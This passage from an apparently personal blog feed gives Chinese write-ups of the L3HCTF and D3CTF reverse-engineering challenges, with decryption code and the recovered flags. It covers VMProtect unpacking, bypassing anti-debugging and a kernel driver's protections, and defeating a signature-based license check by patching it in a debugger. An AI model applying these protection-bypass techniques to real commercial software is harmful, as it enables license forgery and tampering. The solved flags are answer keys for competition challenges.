class="type">uint8_t</span>*)v8 + i), (i + <span class="number">8</span>) / <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;L3HCTF&#123;%.32s&#125;\n&quot;</span>, v8);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// L3HCTF&#123;9c50d10ba864bedfb37d7efa4e110bf2&#125;</span></span><br></pre></td></tr></table></figure><p>L3HCTF{9c50d10ba864bedfb37d7efa4e110bf2}</p><h2 id="obfuscate"><a href="#obfuscate" class="headerlink" title="obfuscate"></a>obfuscate</h2><p>调试程序发现会退出，应该有反调试，找到其中一个exit函数，交叉调用发现多处调用，直接把这边的jmp改成retn就可以过反调试。</p><p><img src="/2025/07/14/L3HCTF/image-51.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-52.png" alt="alt text"></p><p>单步调，发现函数里面翻到这两个相邻函数有大量的计算代码。</p><p>250函数是传入一个字符串”WelcometoL3HCTF!”，然后生成26个DWORD密钥，然后再将明文和生成的密钥传入E80函数进行加密。</p><p><img src="/2025/07/14/L3HCTF/image-53.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-54.png" alt="alt text"></p><p>生成的密钥可以再250函数结尾取得。</p><p><img src="/2025/07/14/L3HCTF/image-50.png" alt="alt text"></p><p>调试E80加密函数，第一个这边循环是将输入的两个DWORD值分别加上Key[0]和Key[1]。</p><p><img src="/2025/07/14/L3HCTF/image-55.png" alt="alt text"></p><p>下面是从1开始到0xC的循环加密，这边是核心加密，去除混淆无用计算，动调就可以还原代码。</p><p><img src="/2025/07/14/L3HCTF/image-56.png" alt="alt text"></p><p>加密代码还原：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Encrypt_</span><span class="params">(<span class="type">uint32_t</span>* Input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Key[<span class="number">26</span>] = &#123;</span><br><span class="line">       <span class="number">0x122F2C9C</span>, <span class="number">0xE3BCCAE7</span>, <span class="number">0xD0FFC0F2</span>, <span class="number">0xD9A12544</span>, <span class="number">0x8A27992F</span>, <span class="number">0x55B1B935</span>, <span class="number">0x9110B161</span>, <span class="number">0x92811564</span>,</span><br><span class="line">       <span class="number">0x5CE9B359</span>, <span class="number">0x77C79A51</span>, <span class="number">0x4265527A</span>, <span class="number">0x8AB57C4B</span>, <span class="number">0x11529FA4</span>, <span class="number">0x9D9F63FF</span>, <span class="number">0xA970B936</span>, <span class="number">0xC8EABA0D</span>,</span><br><span class="line">       <span class="number">0x9A0EB4AA</span>, <span class="number">0xB0BC6E7F</span>, <span class="number">0x9784B100</span>, <span class="number">0x70DCD3AE</span>, <span class="number">0x6057A44E</span>, <span class="number">0x89187658</span>, <span class="number">0xE00098A8</span>, <span class="number">0x45773540</span>,</span><br><span class="line">       <span class="number">0xF9374F1A</span>, <span class="number">0x913FA548</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> A = Input[<span class="number">0</span>] + Key[<span class="number">0</span>];</span><br><span class="line">    <span class="type">uint32_t</span> B = Input[<span class="number">1</span>] + Key[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">0xC</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        A = Key[<span class="number">2</span> * i] + (((B ^ A) &gt;&gt; (<span class="number">32</span> - B)) | ((B ^ A) &lt;&lt; B));</span><br><span class="line"></span><br><span class="line">        B = Key[<span class="number">2</span> * i + <span class="number">1</span>] + (((B ^ A) &gt;&gt; (<span class="number">32</span> - A)) | ((B ^ A) &lt;&lt; A));</span><br><span class="line"></span><br><span class="line">        A ^= B;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Input[<span class="number">0</span>] = A;</span><br><span class="line">    Input[<span class="number">1</span>] = B;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>密文的话，查printf的交叉调用就可以找到，这边有进行密文比较，动调取v3数组数据即可。</p><p><img src="/2025/07/14/L3HCTF/image-57.png" alt="alt text"></p><h3 id="解密代码-4"><a href="#解密代码-4" class="headerlink" title="解密代码"></a>解密代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt_</span><span class="params">(<span class="type">uint32_t</span>* Input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Key[<span class="number">26</span>] = &#123;</span><br><span class="line">       <span class="number">0x122F2C9C</span>, <span class="number">0xE3BCCAE7</span>, <span class="number">0xD0FFC0F2</span>, <span class="number">0xD9A12544</span>, <span class="number">0x8A27992F</span>, <span class="number">0x55B1B935</span>, <span class="number">0x9110B161</span>, <span class="number">0x92811564</span>,</span><br><span class="line">       <span class="number">0x5CE9B359</span>, <span class="number">0x77C79A51</span>, <span class="number">0x4265527A</span>, <span class="number">0x8AB57C4B</span>, <span class="number">0x11529FA4</span>, <span class="number">0x9D9F63FF</span>, <span class="number">0xA970B936</span>, <span class="number">0xC8EABA0D</span>,</span><br><span class="line">       <span class="number">0x9A0EB4AA</span>, <span class="number">0xB0BC6E7F</span>, <span class="number">0x9784B100</span>, <span class="number">0x70DCD3AE</span>, <span class="number">0x6057A44E</span>, <span class="number">0x89187658</span>, <span class="number">0xE00098A8</span>, <span class="number">0x45773540</span>,</span><br><span class="line">       <span class="number">0xF9374F1A</span>, <span class="number">0x913FA548</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> A = Input[<span class="number">0</span>];</span><br><span class="line">    <span class="type">uint32_t</span> B = Input[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xC</span>; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        A ^= B;</span><br><span class="line"></span><br><span class="line">        B -= Key[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">        B = ((B &lt;&lt; (<span class="number">32</span> - A)) | (B &gt;&gt; A));</span><br><span class="line">        B ^= A;</span><br><span class="line"></span><br><span class="line">        A -= Key[<span class="number">2</span> * i];</span><br><span class="line">        A = ((A &lt;&lt; (<span class="number">32</span> - B)) | (A &gt;&gt; B));</span><br><span class="line">        A ^= B;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Input[<span class="number">0</span>] = A - Key[<span class="number">0</span>];</span><br><span class="line">    Input[<span class="number">1</span>] = B - Key[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Key[<span class="number">26</span>] = &#123;</span><br><span class="line">         <span class="number">0x122F2C9C</span>, <span class="number">0xE3BCCAE7</span>, <span class="number">0xD0FFC0F2</span>, <span class="number">0xD9A12544</span>, <span class="number">0x8A27992F</span>, <span class="number">0x55B1B935</span>, <span class="number">0x9110B161</span>, <span class="number">0x92811564</span>,</span><br><span class="line">         <span class="number">0x5CE9B359</span>, <span class="number">0x77C79A51</span>, <span class="number">0x4265527A</span>, <span class="number">0x8AB57C4B</span>, <span class="number">0x11529FA4</span>, <span class="number">0x9D9F63FF</span>, <span class="number">0xA970B936</span>, <span class="number">0xC8EABA0D</span>,</span><br><span class="line">         <span class="number">0x9A0EB4AA</span>, <span class="number">0xB0BC6E7F</span>, <span class="number">0x9784B100</span>, <span class="number">0x70DCD3AE</span>, <span class="number">0x6057A44E</span>, <span class="number">0x89187658</span>, <span class="number">0xE00098A8</span>, <span class="number">0x45773540</span>,</span><br><span class="line">         <span class="number">0xF9374F1A</span>, <span class="number">0x913FA548</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Cipher[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0xF2A1BB1B</span>, <span class="number">0x21877CE9</span>, <span class="number">0x0AFD378A</span>, <span class="number">0xBC811A94</span>, <span class="number">0xAAE31E40</span>, <span class="number">0x3FD82E73</span>, <span class="number">0x4271B884</span>, <span class="number">0x398B35CC</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i+=<span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Decrypt_</span>((<span class="type">uint32_t</span>*)((<span class="type">uint8_t</span>*)Cipher + i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;L3HCTF&#123;%.32s&#125;\n&quot;</span>, Cipher);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// L3HCTF&#123;5fd277be39046905ef6348ba89131922&#125;</span></span><br></pre></td></tr></table></figure><p>L3HCTF{5fd277be39046905ef6348ba89131922}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;L3HCTF-Reverse-WP&quot;&gt;&lt;a href=&quot;#L3HCTF-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;L3HCTF Reverse WP&quot;&gt;&lt;/a&gt;L3HCTF Reverse WP&lt;/h1&gt;&lt;p&gt;放假生物钟已经倒过来</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>D3CTF Reverse WP</title>
    <link href="https://tkazer.github.io/2025/06/01/D3CTF-Reverse/"/>
    <id>https://tkazer.github.io/2025/06/01/D3CTF-Reverse/</id>
    <published>2025-06-01T03:00:56.000Z</published>
    <updated>2025-06-01T08:47:36.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次比赛做了d3kernel和locked door这两题，也是都拿下了一血。这两题都是强对抗类型，和传统的加解密类型题目有区别。kernel是内核逆向&amp;反调试对抗；第二题是vmp对抗+real world类型，模仿的场景是商业软件许可证伪造逆向。这两题都挺有意思的，质量也都很高。</p><h1 id="locked-door"><a href="#locked-door" class="headerlink" title="locked door"></a>locked door</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p>查壳发现是vmp 3.5.1+的壳，</p><p><img src="/2025/06/01/D3CTF-Reverse/image.png" alt="alt text"></p><h3 id="绕过反调试"><a href="#绕过反调试" class="headerlink" title="绕过反调试"></a>绕过反调试</h3><p>由于vmp 3.5.1+的检测很严，scyllahide插件已经没办法过了，这边赛中用的是下面这个付费调试器动调的，这边提供另一个方案。titanhide驱动来处理vmp调试。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-2.png" alt="alt text"></p><p>使用VKD工具的target64中的vminstall在虚拟机中运行安装，会多出来一个引导启动，重启电脑选择新的引导启动就可以，他会进入内核调试模式，禁止驱动强制签名以及关闭PG，也就可以让我们加载titanhide驱动。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-81.png" alt="alt text"></p><p>在github上下载titanhide编译版本。</p><p><a href="https://github.com/mrexodia/TitanHide/releases">https://github.com/mrexodia/TitanHide/releases</a></p><p>直接拖入TitanHide.sys加载运行。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-82.png" alt="alt text"></p><p>将titanhide中的x64插件这两个文件拖入dbg的plugins文件夹即可。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-83.png" alt="alt text"></p><p>现在直接打开x64dbg，拖入程序运行就可以进行愉快的调试了。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-84.png" alt="alt text"></p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>vmp找OEP的思路如下，断点QueryPerformanceCounter或GetSystemTimeAsFileTime都可以，可能执行一次不太够，要执行到返回地址的第二个栈顶地址是在.text段范围内的，此时第二个栈顶地址就是ope了。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-85.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-86.png" alt="alt text"></p><p>很明显的看出确实是ope的代码</p><p><img src="/2025/06/01/D3CTF-Reverse/image-87.png" alt="alt text"></p><p>f4让程序走到这个oep下面的这个jmp，这时直接dump即可。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-88.png" alt="alt text"></p><p>IDA反编译，字符串搜索key1定位到核心main函数。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-7.png" alt="alt text"></p><p>可以在oep这个jmp跳过来后的代码段下面找到核心main函数的调用，接下来就是调试就可以了。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-89.png" alt="alt text"></p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>main函数发现反编译不完全，发现是sub_7FF73E5EC840里面调用的一个call导致的，可以从传参+函数具体实现发现这应该是一个读取key文件的函数。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-12.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-14.png" alt="alt text"></p><p>暂时将两处调用读取key文件的函数相关代码nop，让我们的反编译可以看到完整代码。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-15.png" alt="alt text"></p><p>以下是完整反编译代码，第一个if应该就是校验Key1的函数， sub_7FF73E5EC900跟进看发现是一堆加密代码，且其中调用的sub_7FF73E797910似乎存在虚拟化，没办法看代码，只能进行调试看看具体是什么功能。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-16.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-17.png" alt="alt text"></p><p>调试走到sub_7FF73E5EC900调用处发现参数一传入的就是key1.bin的256字节数据指针。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-18.png" alt="alt text"></p><p>步入跟进函数，走到sub_7FF73E797910函数调用处，发现参数二传入的是key1.bin数据。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-19.png" alt="alt text"></p><p>步过函数执行，跳转到刚刚参数一的地址，发现只是把参数二的数据复制了一份到参数一，那么这个函数实际上的作用和memcpy是一样的。</p><p>sub_7FF73E5EC900这函数功能就是将key.bin输入数据进行一次加密。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-20.png" alt="alt text"></p><p>if那边调用的函数是对加密后的key数据进行一次EVP签名校验，可以通过进入各个函数里面，看到一些文本就可以知道是openssl的EVP代码。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-22.png" alt="alt text"></p><p>而参数一就是要校验的目标文本，让key1.bin加密后的数据和”Welcome”进行签名校验。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-23.png" alt="alt text"></p><p>可以看到下面调用函数结构和上面key1差不多，都是读入key2.bin然后进行sub_7FF73E5EC900的一次加密，最后与”Here is the key”进行签名校验，不过key2的EVP校验函数被vmp保护了，没办法查看代码。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-24.png" alt="alt text"></p><p>从题目的描述可知key1和key1校验逻辑完全相同，那我们就可以从这个点出发进行伪造绕过校验。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-25.png" alt="alt text"></p><h2 id="伪造绕过签名校验"><a href="#伪造绕过签名校验" class="headerlink" title="伪造绕过签名校验"></a>伪造绕过签名校验</h2><p>上文可知key1和key2校验逻辑是完全一样，由于key1校验是通过的，那我们就可以复制一份key1.bin改名覆盖key2.bin，让程序读key2.bin的时候实际读入的是key1的数据，然后断点在key2的EVPCheck函数，将参数一字符串地址改成’Welcome”字串的地址，最终让程序校验成功。</p><p>以下实操：</p><p>修改完key2.bin后，断点在Check2处，将参数一改成”Welcome”的地址。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-26.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-27.png" alt="alt text"></p><p>步过执行Check2后，key2校验成功，flag就从Check2保护函数中输出出来了。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-28.png" alt="alt text"></p><p>d3ctf{Y0u_0p3n_7h3_d00r!!!}</p><h1 id="d3kernel"><a href="#d3kernel" class="headerlink" title="d3kernel"></a>d3kernel</h1><h2 id="R3分析"><a href="#R3分析" class="headerlink" title="R3分析"></a>R3分析</h2><p>调试client.exe，发现单步走会触发除0异常，最后跳到这一个函数，发现里面全都是r3层单纯的io交互和校验，并没用用到驱动通信。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-29.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-30.png" alt="alt text"></p><p>调试，随便输入点东西，在这两处strncmp可以找到两个目标对应字符串，但这个password是fake的，名字后面还能用的到。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-33.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-32.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-34.png" alt="alt text"></p><p>汇编界面发现上层的这个call存在异常，将箭头处jmp nop即可看到完整的代码。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-35.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-36.png" alt="alt text"></p><p>发现这边有个反调试，然后走了不同代码，如果检测到被调试，就走我们上面分析的那个纯r3的交互，如果没有被检测到，就走真实的R0通信交互。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-37.png" alt="alt text"></p><p>要想调试真实的代码部分，我们就要在反调试和检测驱动handle的地方做一下处理，因为我们目前还没有运行驱动，找不到驱动句柄的。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-38.png" alt="alt text"></p><p>反调试这边直接将返回值rax改成0就可以绕过反调试。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-39.png" alt="alt text"></p><p>createFile处我们也可以从参数得到”\\.\d3ctf”，mov r15,rax处将rax改成1就可以绕过这边的合法句柄校验。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-40.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-41.png" alt="alt text"></p><p>经过调试可以发现这边是解密出一些字符串，然后输出输入。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-42.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-43.png" alt="alt text"></p><p>然后将name和password指针放到一个结构体里面({name,password})，通信传到R0，然后再通信一次得到返回数据，再解密输出。控制码分别是0x222000和0x222004。到此整体R3流程分析完毕。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-44.png" alt="alt text"></p><h2 id="R0分析"><a href="#R0分析" class="headerlink" title="R0分析"></a>R0分析</h2><h3 id="代码流程分析"><a href="#代码流程分析" class="headerlink" title="代码流程分析"></a>代码流程分析</h3><p>DriverEntry进来，发现函数这边存在反调试检测以及对R3程序进程保护，反调试检测到会直接将windbg调试剥离。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-46.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-47.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-48.png" alt="alt text"></p><p>直接将红框处代码全部nop，就可以去掉所有的反调试和保护了，主要分析就在这边的MajorFunction，sub_1400011A0进行分析。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-49.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-50.png" alt="alt text"></p><p>我们确实也可以在这里面找到两个控制码的判断和执行代码。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-52.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-51.png" alt="alt text"></p><p>在控制码0x222004下面，有两处文本解密，可以模拟代码，手动解密出来为这两个字符串。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-55.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-53.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-54.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DecText</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *enc, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> v45&#123;&#125;;</span><br><span class="line">    <span class="type">char</span> v47&#123;&#125;, v48&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v47 = <span class="number">52</span> * (v45 / <span class="number">52</span>);</span><br><span class="line">        v48 = v45++;</span><br><span class="line">        enc[i] ^= v48 - v47 + <span class="number">55</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> unk_140004270[<span class="number">29</span>] = &#123;</span><br><span class="line">        <span class="number">0x46</span>, <span class="number">0x4F</span>, <span class="number">0x48</span>, <span class="number">0x16</span>, <span class="number">0x1B</span>, <span class="number">0x4B</span>, <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0x1E</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x28</span>, <span class="number">0x3F</span>,</span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x3B</span>, <span class="number">0x2C</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x71</span>, <span class="number">0x70</span>, <span class="number">0x73</span>, <span class="number">0x53</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> unk_140004290[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x4D</span>, <span class="number">0x59</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x17</span>, <span class="number">0x1C</span>, <span class="number">0x49</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x60</span>, <span class="number">0x20</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x2D</span>, <span class="number">0x2B</span>, <span class="number">0x46</span>&#125;;</span><br><span class="line">    <span class="built_in">DecText</span>(unk_140004270, <span class="number">29</span>);</span><br><span class="line">    <span class="built_in">DecText</span>(unk_140004290, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.29s\n&quot;</span>, unk_140004270);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.16s\n&quot;</span>, unk_140004290);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就可以知道这部分就是对加密后的name和password进行校验，校验成功输出”qwq, why!!!!! my secret!!!!!”，校验失败，跳转到下面输出”zako, try again”。</p><p>这部分代码我们也可以看到外层校验了28个字节，内层校验了144个字节，分别除以4就是7和36，分别对应上了r3层的name和password的长度。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-56.png" alt="alt text"></p><p>在上面代码部分也可以看到有password和name的数据加载，一个36循环一个7循环就可以分辨出来。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-57.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-58.png" alt="alt text"></p><p>这边有调用到的sub_14000270C是一个虚拟机代码，目前不知道执行了什么。接下来就先在两处的数据加载动调分析入手，看看password和name都做了什么处理。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-59.png" alt="alt text"></p><h3 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h3><p>这边实际调试发现，这边扫描nt模块地址时候会导致蓝屏，所以最好在箭头处断点，手动赋值上nt模块地址，d3ctf+0x1CC4。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-60.png" alt="alt text"></p><p>先用sxe ld d3ctf命令拦截断点该驱动的加载。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-61.png" alt="alt text"></p><p>加载驱动断下后，设置d3ctf+0x1CC4的断点。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-62.png" alt="alt text"></p><p>断下后lm vm nt查询nt的地址得到fffff804&#96;75e00000，手动给d3ctf+0x5400赋值即可。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-63.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-64.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-65.png" alt="alt text"></p><p>在我们刚刚要动调的36循环处下断点，运行成功断下。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-66.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-67.png" alt="alt text"></p><p>这边可以发现要给eax赋值的数组处就是我们r3输入传进来的password，单步执行完call，可以发现参数一是r14赋值给rcx的，查看执行完函数的r14，发现是一个两个DWORD64地址的结构体。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-68.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-69.png" alt="alt text"></p><p>直接pa d3ctf+0x1596让代码执行到此处，也就是for循环结束后的代码。</p><p>再次查看r14结构的第二个地址，发现这循环实际作用就是将输入的36 password字节都转换成DWORD类型，存入到一个数组。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-70.png" alt="alt text"></p><p>单步执行完循环下面的两个VM后，发现是给这个数组前面加了个0x24数据</p><p><img src="/2025/06/01/D3CTF-Reverse/image-71.png" alt="alt text"></p><p>pa d3ctf+0x19E2，跳到name那边循环赋值的循环结束地址，同样查看参数一，这边是r15，发现是和password初始操作一样，将输入字符串转成DWORD数组存入。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-72.png" alt="alt text"></p><p>接下来我们先不管中途对password和name的一些加密操作，直接跳到Check处，这边是28字节Check，对应name的DWORD长度。</p><p>pa d3ctf+0x1A99</p><p><img src="/2025/06/01/D3CTF-Reverse/image-73.png" alt="alt text"></p><p><img 